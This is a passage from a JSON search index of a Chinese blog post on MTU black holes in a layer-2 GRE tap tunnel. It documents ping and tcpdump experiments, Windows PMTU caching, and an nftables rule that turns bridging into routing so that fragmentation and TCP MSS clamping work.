unreachable","text":"<p>\u8fd8\u662f\u4e0a\u4e00\u4e2a\u5b9e\u9a8c\uff0c\u628a\u5176\u4e2d\u4e00\u4e2a\u63a5\u53e3 mtu \u8c03\u5c0f\uff1a</p> <pre><code>kvm-win10 (1500)-&gt; pve vmbr1(1280) -&gt; op1: eth1 (1280)-&gt;  br-lan (1280)\n</code></pre> <p>\u8bbe\u7f6e eth1 mtu \u540e\u3002\u5b8c\u5168 ping \u4e0d\u901a\uff0cop1 \u4e0a tcpdump \u6293\u4e0d\u5230\u4efb\u4f55\u5305\uff0c\u53ea\u6709 pve vmbr1 \u4e0a\u80fd\u6293\u5230\u3002 \u6b64\u65f6\u5373\u4f7f\u662f\u5141\u8bb8\u5206\u7247\uff0c\u4e5f\u662f\u4e00\u6837\u7684\u73b0\u8c61\u3002</p> <pre><code>$ ping 192.168.35.1 -l 1472 -f\n\n\u6b63\u5728 Ping 192.168.35.1 \u5177\u6709 1472 \u5b57\u8282\u7684\u6570\u636e:\n\u8bf7\u6c42\u8d85\u65f6\u3002\n</code></pre> <pre><code>$ ping 192.168.35.1 -l 1472\n\n\u6b63\u5728 Ping 192.168.35.1 \u5177\u6709 1472 \u5b57\u8282\u7684\u6570\u636e:\n\u8bf7\u6c42\u8d85\u65f6\u3002\n</code></pre> <p>\u4ea7\u751f\u8be5\u73b0\u8c61\u7684\u539f\u56e0\u662f\uff0cop1 eth1 \u7684 mtu \u5c0f\u4e86\uff0c\u5305\u6839\u672c\u4f20\u4e0d\u5230 op1\u3002\u56e0\u4e3a\u5b83\u4eec\u4f4d\u4e8e\u540c\u4e00\u4e2a\u4e8c\u5c42\uff0c\u6ca1\u6709\u8def\u7531\u5668\u8d1f\u8d23\u5206\u7247\u3002</p> <p>\u800c op1 \u53c8\u6ca1\u6cd5\u8fd4\u56de ICMP \u62a5\u9519\u4fe1\u606f\uff08\u56e0\u4e3a\u8fd9\u91cc op1 \u4e0d\u505a\u4e3a\u8def\u7531\u5668\uff09\uff0c\u56e0\u6b64 kvm-win10 \u4ecd\u7136\u7ee7\u7eed\u4ee5\u8be5\u5927\u5c0f\u5305\u53d1\u9001\u3002</p> <p>\u4e0b\u4e00\u4e2a\u5b9e\u9a8c\u8868\u660e\uff0c\u6b64\u65f6\u5982\u679c\u6536\u5230 ICMP \u62a5\u9519\uff0c\u7cfb\u7edf\u5c31\u4f1a\u8c03\u6574 PMTU\uff0c\u5728\u4e0b\u6b21\u53d1\u9001 icmp request \u65f6\u5c31\u8fdb\u884c\u5206\u7247\u3002</p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u5b9e\u9a8c\u4e09icmp-\u5f71\u54cd\u7cfb\u7edf-pmtu-\u7f13\u5b58","title":"\u5b9e\u9a8c\u4e09\uff1aICMP \u5f71\u54cd\u7cfb\u7edf PMTU \u7f13\u5b58","text":"<p>op1 \u548c op2 \u901a\u8fc7 wireguard \u96a7\u9053 wg_s2s \u8fde\u63a5\uff0c\u800c\u8be5\u96a7\u9053\u6211\u5c06 MTU \u8bbe\u7f6e\u6210\u4e86 1400\u3002\u5f53 kvm-win10 ping op2 \u7684 wg \u5730\u5740\u65f6\uff0c\u5c31\u4f1a\u7ecf\u8fc7\u8be5\u96a7\u9053\u3002\u5927\u81f4\u8fc7\u7a0b\uff1a</p> <pre><code>kvm-win10(1500) -&gt; op1 eth1(1500) -&gt; op1 wg_s2s (1400) (out)\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\u4e0d\u5141\u8bb8\u5206\u7247\u65f6\uff0c\u65e0\u6cd5 ping \u901a\uff0c\u8def\u7531\u5668\u8fd4\u56de ICMP \u62a5\u9519\u3002\u5141\u8bb8\u5206\u7247\u5c31\u53ef\u4ee5\u6b63\u5e38 ping \u901a\u4e86\u3002</p> <pre><code>$ ping 10.0.32.2 -l 1373 -f\n\n\u6b63\u5728 Ping 10.0.32.2 \u5177\u6709 1373 \u5b57\u8282\u7684\u6570\u636e:\n\u6765\u81ea 192.168.35.1 \u7684\u56de\u590d: \u9700\u8981\u62c6\u5206\u6570\u636e\u5305\u4f46\u662f\u8bbe\u7f6e DF\u3002\n\u9700\u8981\u62c6\u5206\u6570\u636e\u5305\u4f46\u662f\u8bbe\u7f6e DF\u3002\n\u9700\u8981\u62c6\u5206\u6570\u636e\u5305\u4f46\u662f\u8bbe\u7f6e DF\u3002\n\n$ ping 10.0.32.2 -l 1373\n\n\u6b63\u5728 Ping 10.0.32.2 \u5177\u6709 1373 \u5b57\u8282\u7684\u6570\u636e:\n\u6765\u81ea 10.0.32.2 \u7684\u56de\u590d: \u5b57\u8282=1373 \u65f6\u95f4=2ms TTL=63\n\u6765\u81ea 10.0.32.2 \u7684\u56de\u590d: \u5b57\u8282=1373 \u65f6\u95f4=2ms TTL=63\n</code></pre> <p>\u5e76\u4e14 tcpdump \u6293\u5305\u53ef\u4ee5\u770b\u5230\u7b2c\u4e8c\u6b21 ping \u65f6\uff0ckvm-win10 \u5df2\u7ecf\u63d0\u524d\u5c06\u5305\u8fdb\u884c\u5206\u7247\u4e86\u3002</p> <ul> <li>\u7b2c\u4e00\u6761<code>192.168.35.5 &gt; 10.0.32.2</code>\uff0clength \u8fd8\u662f 1281 (1373+8)</li> <li>\u7b2c\u4e8c\u6b21 echo request \u5c31\u5df2\u7ecf\u53d8\u6210\u8fde\u7eed\u4e24\u6761<code>192.168.35.5 &gt; 10.0.32.2</code>\u4e86\u3002\uff08\u957f\u5ea6\u662f 1376 \u800c\u4e0d\u662f MTU \u5bf9\u5e94\u7684 1400 - 20(ip header) = 1380\uff0c\u662f\u56e0\u4e3a ipv4 \u5206\u7247\u9700\u8981 8 \u5b57\u8282\u5bf9\u9f50\uff09</li> </ul> <pre><code>root@op1 \u279c  ~ tcpdump -ni eth1 icmp and host 192.168.35.5\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n20:45:09.452565 IP 192.168.35.5 &gt; 10.0.32.2: ICMP echo request, id 1, seq 1400, length 1381\n20:45:09.452590 IP 192.168.35.1 &gt; 192.168.35.5: ICMP 10.0.32.2 unreachable - need to frag (mtu 1400), length 556\n20:45:17.217676 IP 192.168.35.5 &gt; 10.0.32.2: ICMP echo request, id 1, seq 1403, length 1376\n20:45:17.217681 IP 192.168.35.5 &gt; 10.0.32.2: ip-proto-1\n20:45:17.219738 IP 10.0.32.2 &gt; 192.168.35.5: ICMP echo reply, id 1, seq 1403, length 1256\n20:45:17.219741 IP 10.0.32.2 &gt; 192.168.35.5: ip-proto-1\n</code></pre> <p>\u800c\u8981\u60f3\u63d0\u524d\u5206\u7247\uff0c\u8868\u660e OS \u9700\u8981\u7f13\u5b58\u76ee\u7684\u5730\u5740\u7684 PMTU\uff0cwindows \u6709\u547d\u4ee4\u53ef\u4ee5\u67e5\u770b PMTU</p> <pre><code>netsh interface ipv4 show destinationcache\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u76ee\u7684\u5730\u5740\u5df2\u7ecf\u88ab\u8bbe\u7f6e\u6210\u4e86 1400</p> <pre><code>\u63a5\u53e3 16: \u4ee5\u592a\u7f51 2\n\n\nPMTU \u76ee\u6807\u5730\u5740                                      \u4e0b\u4e00\u4e2a\u8dc3\u70b9\u5730\u5740\n---- --------------------------------------------- -------------------------\n1400 10.0.32.2                                     192.168.35.1\n1500 20.42.65.91                                   192.168.35.1\n1500 39.91.134.53                                  192.168.35.1\n</code></pre> <p>\u4e4b\u540e\u518d\u53d1\u9001\u5927\u4e8e PMTU \u7684\u5305\u4e14\u7981\u6b62\u5206\u7247\u65f6\uff0cwindows \u5c31\u4f1a\u76f4\u63a5\u63d0\u793a\u9700\u8981\u5206\u7247\uff0c\u800c\u4e0d\u4f1a\u628a\u5305\u53d1\u51fa\u53bb\uff0c\u56e0\u6b64\u6536\u4e0d\u5230\u6765\u81ea\u8def\u7531\u5668\u7684 ICMP \u62a5\u9519\u6d88\u606f\u3002</p> <pre><code>$ ping 10.0.32.2 -l 1373 -f\n\n\u6b63\u5728 Ping 10.0.32.2 \u5177\u6709 1373 \u5b57\u8282\u7684\u6570\u636e:\n\u9700\u8981\u62c6\u5206\u6570\u636e\u5305\u4f46\u662f\u8bbe\u7f6e DF\u3002\n\u9700\u8981\u62c6\u5206\u6570\u636e\u5305\u4f46\u662f\u8bbe\u7f6e DF\u3002\n</code></pre> <p>\u5982\u679c\u4e00\u5f00\u59cb\u4e0d\u9650\u5236\u5206\u7247</p> <p>\u5982\u679c\u6ca1\u6709\u5efa\u7acb\u6b63\u786ePMTU\u524d\u53d1\u9001\u4e00\u4e2a\u5927\u5305\uff0c\u5219\u8def\u7531\u5668\u4e0d\u4f1a\u8fd4\u56deICMP need fragment\uff0c\u800c\u662f\u76f4\u63a5\u5206\u7247\u4f20\u8f93\u3002\u8fd9\u6837\u5176\u5b9e\u5e76\u4e0d\u80fd\u5b66\u4e60\u5230PMTU\u3002</p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u5b9e\u9a8c\u56dbgre-tap-\u96a7\u9053\u5bfc\u81f4\u4e8c\u5c42-mtu-\u4e0d\u4e00\u81f4","title":"\u5b9e\u9a8c\u56db\uff1aGRE Tap \u96a7\u9053\u5bfc\u81f4\u4e8c\u5c42 MTU \u4e0d\u4e00\u81f4","text":"<p>\u7531\u4e8e GRE Tap \u7684\u5b58\u5728\uff0c\u5bfc\u81f4\u539f\u672c\u5168\u90e8\u90fd\u662f 1500MTU \u7684\u4e8c\u5c42\u91cc\uff0c\u51fa\u73b0\u4e86 1284 \u7684\u96a7\u9053\u901a\u8def\u3002\u56e0\u6b64\u53ea\u8981\u5927\u4e8e\u8be5 MTU \u7684\u5305\u901a\u8fc7\u8be5\u901a\u8def\u5c31\u4f1a\u88ab\u4e22\u5f03\uff0c\u5e76\u4e14\u4e0d\u4f1a\u8fd4\u56de ICMP\uff0c\u4ece\u800c\u5bfc\u81f4\u9ed1\u6d1e\u3002</p> <p>op1 \u4e0b\u7684 KVM-win10 ping op2 \u4e0b\u7684\u7b14\u8bb0\u672c\u65f6\uff0c\u53ea\u8981 icmp data \u5927\u4e8e 1256 \u5c31\u4f1a\u5bfc\u81f4\u8be5\u73b0\u8c61\u3002\u5373\u4f7f\u5141\u8bb8\u5206\u7247\uff0c\u4e5f ping \u4e0d\u901a\u3002</p> <pre><code>$ ping 192.168.35.180 -l 1256\n\n\u6b63\u5728 Ping 192.168.35.180 \u5177\u6709 1256 \u5b57\u8282\u7684\u6570\u636e:\n\u6765\u81ea 192.168.35.180 \u7684\u56de\u590d: \u5b57\u8282=1256 \u65f6\u95f4=2ms TTL=128\n\u6765\u81ea 192.168.35.180 \u7684\u56de\u590d: \u5b57\u8282=1256 \u65f6\u95f4=2ms TTL=128\n\n$ ping 192.168.35.180 -l 1257\n\n\u6b63\u5728 Ping 192.168.35.180 \u5177\u6709 1257 \u5b57\u8282\u7684\u6570\u636e:\nControl-C\n</code></pre>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u603b\u7ed3\u4e0e\u601d\u8003","title":"\u603b\u7ed3\u4e0e\u601d\u8003","text":"<ul> <li>\u539f\u56e0\u5728\u4e8e\u4e8c\u5c42 MTU \u4e0d\u4e00\u81f4\uff0c\u5bfc\u81f4\u5305\u7ecf\u8fc7\u4e00\u4e2a\u66f4\u5c0f\u7684\u901a\u8def\u65f6\u65e2\u65e0\u6cd5\u5206\u7247\uff0c\u4e5f\u65e0\u6cd5\u8fd4\u56de ICMP \u62a5\u9519\uff08\u5426\u5219\u8bbe\u7f6e\u4e86 PMTU\uff0c\u4e0b\u4e00\u6b21\u5c31\u53ef\u4ee5\u901a\u8fc7\uff09\uff0c\u4ece\u800c\u5bfc\u81f4\u9ed1\u6d1e\u3002</li> <li>\u5bf9\u4e8e TCP \u8fd8\u80fd\u901a\u8fc7 MSS clamping \u89e3\u51b3\uff0c\u4f46\u662f\u5bf9\u4e8e UDP \u5c31\u6ca1\u6709\u529e\u6cd5\u4e86</li> <li>\u5982\u679c\u4e8c\u5c42\u96a7\u9053\u9700\u8981\u4fdd\u8bc1 MTU \u4e00\u81f4\uff0c\u90a3\u7528\u9014\u662f\u5426\u592a\u5c0f\uff1f\u5047\u8bbe\u96a7\u9053 MTU \u5c0f\u4e8e 1500\uff0c\u90a3\u4e48\u6240\u6709 1500 \u7684\u8bbe\u5907\u90fd\u4e0d\u80fd\u63a5\u5165\u8fd9\u4e2a\u96a7\u9053\u3002\u611f\u89c9\u53ea\u80fd\u8fde\u5165\u51e0\u53f0\u53ef\u4ee5\u624b\u52a8\u8c03\u6574 MTU \u7684\u8bbe\u5907\u3002</li> </ul> <ul> <li>\u7591\u70b9\uff1a<ul> <li>\u4e3a\u4ec0\u4e48\u7b14\u8bb0\u672c\u53ef\u4ee5\u6b63\u786e\u8fde\u63a5\uff0c\u800c\u624b\u673a\u5e73\u677f\u4e0d\u884c\u3002wireshark \u6293\u5305\u65f6\uff0c\u786e\u5b9e\u7b14\u8bb0\u672c\u7684\u5305\u66f4\u5c0f\uff0c\u4e0d\u4f1a\u8d85\u8fc7 MTU\u3002<ul> <li>OS \u4e0d\u540c\uff1fwindows \u53ef\u80fd\u81ea\u5df1\u505a\u4e86 PMTUD</li> </ul> </li> </ul> </li> </ul> <p>TCP MSS \u5de5\u4f5c\u7684\u6761\u4ef6</p> <p>\u5173\u4e8e\u8fd9\u70b9\uff0c\u505a\u7684\u5b9e\u9a8c\u6570\u636e\u6ca1\u8bb0\u5f55\u597d\u3002\u4f46\u662f\u6309\u7167\u6211\u6a21\u7cca\u7684\u8bb0\u5fc6\uff0c\u4e00\u5f00\u59cbMSS\u5176\u5b9e\u5e76\u6ca1\u6709\u8d77\u4f5c\u7528\u3002\u5148\u8981\u8d77\u4f5c\u7528\uff0c\u53ef\u80fd\u9664\u4e86\u5f00\u542fMSS clamping\uff0c\u8fd8\u9700\u8981\u8bbe\u7f6ebr-lan\u7684MTU\u4e3a\u548cgre-tap\u7684\u4e00\u6837\u3002\u5426\u5219\u4ecd\u7136\u662f\u6309\u7167 bridge\u7684 MTU\u8fdb\u884c clamping\u7684\u3002</p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u53ef\u80fd\u7684\u89e3\u51b3","title":"\u53ef\u80fd\u7684\u89e3\u51b3\uff1f","text":"<ul> <li>\u8bbe\u7f6e\u4e24\u7aef\u8bbe\u5907\u7684 MTU<ul> <li>\u4e0d\u77e5\u9053 Android \u5982\u4f55\u8bbe\u7f6e\u624b\u52a8\u8bbe\u7f6e MTU</li> <li>\u53d1\u73b0\u4ec5\u8bbe\u7f6e windows \u7684 MTU \u4e0d\u884c</li> </ul> </li> <li>windows \u4e0a\u8bbe\u7f6e\u76ee\u6807\u7684 PMTU\uff1f\uff08\u4f46\u662f MTU \u5355\u5411\u7684\uff0c\u8c8c\u4f3c\u5f71\u54cd\u4e0d\u5230\u5bf9\u9762\u53d1\u5305\u3002\u4f46\u662f\u4e5f\u8bb8\u4e32\u6d41\u573a\u666f\u5bf9\u9762\u53d1\u4e0d\u4e86\u5f88\u5927\u7684\u5305\uff1f\uff09<ul> <li>\u53d1\u73b0 windows \u8bbe\u7f6e\u4e0d\u4e86\uff0c\u53ea\u80fd\u63a5\u6536\u5230 ICMP \u65f6\u81ea\u5df1\u6539</li> </ul> </li> <li>\u6709\u6ca1\u6709 L2 \u4e0a\u7684 PMTUD\uff1f\u6216\u8005\u4e0d\u57fa\u4e8e ICMP \u4e0d\u5c31\u884c\u4e86\uff1f</li> <li>ARP proxy\uff0c\u8ba9\u4e24\u8fb9\u901a\u4fe1\u5b9e\u9645\u5e76\u4e0d\u76f4\u63a5\u901a\u4fe1\uff08\u8d70 gre \u96a7\u9053\uff09\uff0c\u800c\u662f\u8ba9\u8def\u7531\u5668\u8def\u7531\u4e00\u4e0b\uff0c\u6bd4\u5982\u901a\u8fc7 wg \u96a7\u9053\u901a\u4fe1\uff1f</li> </ul>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u89e3\u51b3\u4e86","title":"\u89e3\u51b3\u4e86\uff1f","text":"<p>2024/03/17</p> <p>\u5728\u5b66\u4e60 nft \u65f6\uff0c\u5076\u7136\u770b\u5230\u4e00\u4e2a\u4f7f\u7528 nft \u5c06 bridge \u6539\u4e3a routing \u7684\u5199\u6cd5\u3002</p> <pre><code># redirect tcp:http from 192.160.0.0/16 to local machine for routing instead of bridging\n# assumes 00:11:22:33:44:55 is local MAC address.\nbridge input meta iif eth0 ip saddr 192.168.0.0/16 tcp dport 80 meta pkttype set unicast ether daddr set 00:11:22:33:44:55\n</code></pre> <p>\u641c\u7d22\u4e00\u4e0b\uff0c\u771f\u7684\u6709\u8fd9\u79cd\u505a\u6cd5\uff0c\u7528\u4e8e\u5b9e\u73b0\u4e2d\u95f4\u4eba\u653b\u51fb Bridge + nftables: How to redirect incoming HTTP/HTTPS traffic to local port 8080? - Server Fault </p> <p>\u5c1d\u8bd5\u540e\u771f\u7684\u6210\u529f\u4e86</p> <p>nft \u5c06 bridge \u8f6c\u6210 routing</p> <ul> <li>op1 \u548c op2 \u4e0a\u90fd\u9700\u8981\u7c7b\u4f3c\u64cd\u4f5c</li> <li>ether daddr set \u8bbe\u7f6e\u7684\u662f\u8def\u7531\u5668 bridge \u7684 mac \u5730\u5740</li> </ul> <pre><code># op1\n\n# delete table bridge gre_tap_fix_mtu\nadd table bridge gre_tap_fix_mtu\nadd chain bridge gre_tap_fix_mtu c1 { type filter hook prerouting priority -301; }\nadd rule bridge gre_tap_fix_mtu c1 meta iifname eth1 ip daddr 192.168.35.0/24 meta pkttype set host ether daddr set 00:16:3e:4b:67:80 counter\n</code></pre> <p>mtr \u6d4b\u8bd5\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e24\u8fb9 ping \u65f6\uff0c\u8def\u7531\u591a\u4e86\u4e00\u8df3\u3002\u539f\u672c\u662f\u76f4\u63a5\u53d1\u9001\uff0c\u73b0\u5728\u53d8\u6210\u8def\u7531\u5668\u8f6c\u53d1\u4e00\u6b21</p> <p>op1 lan \u5185\u8bbe\u5907\u8bbf\u95ee\u4e24\u4e2a\u8bbe\u5907\uff0c\u5206\u522b\u8fc7 gre \u96a7\u9053\u548c\u4e0d\u8fc7</p> <pre><code>\u279c  ~ tracepath -n 192.168.35.126\n 1?: [LOCALHOST]                      pmtu 1500\n 1:  192.168.35.1                                          0.111ms\n 1:  192.168.35.1                                          0.066ms\n 2:  192.168.35.1                                          0.076ms pmtu 1370\n 2:  192.168.35.126                                      116.700ms reached\n     Resume: pmtu 1370 hops 2 back 2\n\u279c  ~ tracepath -n 192.168.35.5\n 1?: [LOCALHOST]                      pmtu 1500\n 1:  192.168.35.5                                          0.185ms reached\n 1:  192.168.35.5                                          0.230ms reached\n     Resume: pmtu 1500 hops 1 back 1\n\u279c  ~\n</code></pre> <p>\u4f46\u662f\u53d1\u73b0\uff0c\u901a\u4fe1\u7aef\u70b9\u53d1\u6765\u7684\u5305\u5982\u679c\u5df2\u7ecf\u7ecf\u8fc7\u5206\u7247\uff08\u4e4b\u524d\u5b66\u4e60\u4e86 PMTU\uff09\uff0c\u5230\u8fbe\u8def\u7531\u5668\u65f6\u5374\u4f1a\u5c06\u5176\u5408\u5e76\u3002\u7136\u540e\u8def\u7531\u5668\u8f6c\u53d1\u65f6\u518d\u6839\u636e bridge(br-lan, br-lan2) \u7684 MTU \u8fdb\u884c\u5206\u7247\uff0c\u8fd9\u5bfc\u81f4\u4ecd\u7136\u65e0\u6cd5\u901a\u8fc7 GRE \u96a7\u9053\u3002 \u56e0\u6b64\u7b80\u5355\u5730\u8bbe\u7f6e\u4e86\u4e0b br-lan \u7684 MTU\uff0c\u4e00\u5207\u5c31\u6b63\u5e38\u4e86\u3002</p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#ping-\u5927\u5305\u6d4b\u8bd5","title":"ping \u5927\u5305\u6d4b\u8bd5","text":"<p>kvm-win10 ping \u5bf9\u9762\u8bbe\u5907\uff0c\u53ef\u4ee5\u770b\u5230 ping \u5927\u5305\u80fd\u591f ping \u901a\u4e86\uff0c\u8bf4\u660e\u8def\u7531\u5668\u4e0a\u8fdb\u884c\u4e86\u6b63\u786e\u7684\u5206\u7247\u3002</p> <pre><code>$ ping 192.168.35.126 -l 2000\n\n\u6b63\u5728 Ping 192.168.35.126 \u5177\u6709 2000 \u5b57\u8282\u7684\u6570\u636e:\n\u6765\u81ea 192.168.35.126 \u7684\u56de\u590d: \u5b57\u8282=2000 \u65f6\u95f4=80ms TTL=63\n\u6765\u81ea 192.168.35.126 \u7684\u56de\u590d: \u5b57\u8282=2000 \u65f6\u95f4=95ms TTL=63\n</code></pre> <p>op1 \u4e0a\u6293\u5305\u7ed3\u679c</p> <ul> <li>eth1 \u6536\u5230 KVM-win10 \u7684 echo request\uff0c\u662f\u6309\u7167 1500 \u8fdb\u884c\u5206\u7247\u7684\uff08kvm-win10 \u7684 MTU\uff09</li> <li>op1 \u5c06\u5176\u5408\u5e76\uff0c\u603b\u5171 2008B</li> <li>\u7136\u540e\u4ece br-lan \u8f6c\u53d1\u51fa\u53bb\uff08\u5b9e\u9645\u6700\u7ec8\u4ece gre4t-gre3 \u51fa\u53bb\uff09\uff0c\u6309\u7167 1420 \u7684 MTU \u8fdb\u884c\u5206\u7247</li> <li>\u4ece\u5bf9\u9762\u6536\u5230 echo reply\uff0c\u4e5f\u662f\u6309\u7167 1420 \u5206\u7247\u7684\uff08op2 \u4e0a\u8fdb\u884c\u4e86\u548c op1 \u7c7b\u4f3c\u7684\u64cd\u4f5c\uff0c\u65e0\u8bba.126 \u7684\u8bbe\u5907\u662f\u6309\u7167\u591a\u5927\u7684 MTU \u53d1\u9001\u7684\uff0cop2 \u8f6c\u53d1\u65f6\u5c31\u4f1a\u6309\u7167 br-lan \u7684 MTU \u8fdb\u884c\u5206\u7247\uff09</li> </ul> <pre><code># \u4eceeth1 \u6536\u5230\u7684\n17:19:13.358784 eth1  P   IP 192.168.35.5 &gt; 192.168.35.126: ICMP echo request, id 1, seq 1988, length 1472\n17:19:13.358785 eth1  P   IP 192.168.35.5 &gt; 192.168.35.126: ip-proto-1\n# \u5408\u5e76\n17:19:13.358785 br-lan In  IP 192.168.35.5 &gt; 192.168.35.126: ICMP echo request, id 1, seq 1988, length 2008\n# \u4ecebr-lan \u8f6c\u53d1\u51fa\u53bb\uff0c\u8fdb\u884c\u5206\u7247\n17:19:13.358832 br-lan Out IP 192.168.35.5 &gt; 192.168.35.126: ICMP echo request, id 1, seq 1988, length 1400\n17:19:13.358834 gre4t-gre3 Out IP 192.168.35.5 &gt; 192.168.35.126: ICMP echo request, id 1, seq 1988, length 1400\n17:19:13.358841 br-lan Out IP 192.168.35.5 &gt; 192.168.35.126: ip-proto-1\n17:19:13.358842 gre4t-gre3 Out IP 192.168.35.5 &gt; 192.168.35.126: ip-proto-1\n\n# \u8fd4\u56de\n# \u6536\u5230\u7684\u5df2\u7ecf\u662f\u5206\u7247\u7684\u4e86\uff0c\u76f4\u63a5\u8f6c\u53d1\n17:19:13.438654 gre4t-gre3 P   IP 192.168.35.126 &gt; 192.168.35.5: ICMP echo reply, id 1, seq 1988, length 1400\n17:19:13.438656 gre4t-gre3 P   IP 192.168.35.126 &gt; 192.168.35.5: ip-proto-1\n17:19:13.438689 eth1  Out IP 192.168.35.126 &gt; 192.168.35.5: ICMP echo reply, id 1, seq 1988, length 1400\n17:19:13.438690 eth1  Out IP 192.168.35.126 &gt; 192.168.35.5: ip-proto-1\n</code></pre>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#tcp-mss-\u4e5f\u662f\u6b63\u5e38\u5de5\u4f5c\u7684","title":"TCP MSS \u4e5f\u662f\u6b63\u5e38\u5de5\u4f5c\u7684","text":"<p>192.168.35.126 ssh 192.168.35.2</p> <p>op2 \u4e0a\u53ef\u4ee5\u770b\u5230\u7ecf\u8fc7 gre4t-gre3 \u63a5\u53e3\u51fa\u53bb\u7684 MSS \u662f 1380\uff08\u5bf9\u5e94 MTU 1420\uff09</p> <pre><code>root@op2 \u279c  ~ tcpdump -ni gre4t-gre3 tcp port 2202 and host 192.168.35.2 and 'tcp[tcpflags] &amp; (tcp-syn) != 0'\n\n17:29:15.468383 IP 192.168.35.126.55960 &gt; 192.168.35.2.2202: Flags [S], seq 604249636, win 65535, options [mss 1380,sackOK,TS val 573389803 ecr 0,nop,wscale 9], length 0\n17:29:15.661593 IP 192.168.35.2.2202 &gt; 192.168.35.126.55960: Flags [S.], seq 353962643, ack 604249637, win 65160, options [mss 1380,sackOK,TS val 265849573 ecr 573389803,nop,wscale 7], length 0\n</code></pre> <p>op1 \u4e0a\u66f4\u76f4\u89c2\uff0c192.168.35.2 \u521a\u5f00\u59cb\u7684 MSS \u662f 1460\uff0c\u7ecf\u8fc7 br-lan Out \u65f6\u5c31\u6539\u4e3a\u4e86 1380 \u4e86</p> <pre><code>root@op1 \u279c  ~ tcpdump -ni any tcp port 2202 and host 192.168.35.2 and 'tcp[tcpflags] &amp; (tcp-syn) != 0'\n\n17:29:15.466272 gre4t-gre3 P   IP 192.168.35.126.55960 &gt; 192.168.35.2.2202: Flags [S], seq 604249636, win 65535, options [mss 1380,sackOK,TS val 573389803 ecr 0,nop,wscale 9], length 0\n17:29:15.466306 eth1  Out IP 192.168.35.126.55960 &gt; 192.168.35.2.2202: Flags [S], seq 604249636, win 65535, options [mss 1380,sackOK,TS val 573389803 ecr 0,nop,wscale 9], length 0\n\n# \u521a\u5f00\u59cb\u662f1460\n17:29:15.658494 eth1  P   IP 192.168.35.2.2202 &gt; 192.168.35.126.55960: Flags [S.], seq 353962643, ack 604249637, win 65160, options [mss 1460,sackOK,TS val 265849573 ecr 573389803,nop,wscale 7], length 0\n17:29:15.658494 br-lan In  IP 192.168.35.2.2202 &gt; 192.168.35.126.55960: Flags [S.], seq 353962643, ack 604249637, win 65160, options [mss 1460,sackOK,TS val 265849573 ecr 573389803,nop,wscale 7], length 0\n\n# \u8bbe\u7f6e\u4e3a1380\n17:29:15.658511 br-lan Out IP 192.168.35.2.2202 &gt; 192.168.35.126.55960: Flags [S.], seq 353962643, ack 604249637, win 65160, options [mss 1380,sackOK,TS val 265849573 ecr 573389803,nop,wscale 7], length 0\n17:29:15.658514 gre4t-gre3 Out IP 192.168.35.2.2202 &gt; 192.168.35.126.55960: Flags [S.], seq 353962643, ack 604249637, win 65160, options [mss 1380,sackOK,TS val 265849573 ecr 573389803,nop,wscale 7], length 0\n</code></pre>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#nft-\u67e5\u770b-mss-\u88ab\u4fee\u6539\u7684\u8fc7\u7a0b","title":"nft \u67e5\u770b MSS \u88ab\u4fee\u6539\u7684\u8fc7\u7a0b","text":"<p>op2 \u4fa7\u7684\u65e0\u7ebf\u8def\u7531\u5668\u4e0b\u7684\u624b\u673a\uff08192.168.35.126\uff09ssh op1\uff08192.168.35.1\uff09\u3002op2 \u4e0a\u4f7f\u7528 nft \u6293 TCP sync \u5305</p> <p>\u53ef\u4ee5\u770b\u5230 ether daddr \u88ab\u6210\u529f\u4fee\u6539\uff0c\u5305\u8fdb\u5165\u4e86 forward mangle\uff0c\u4fee\u6539\u4e86 MSS</p> <ul> <li><code>iif \"br-lan2\" ether saddr 5a:ff:4d:38:41:2f ether daddr ca:84:4a:ec:90:53 ip saddr 192.168.35.126 ip daddr 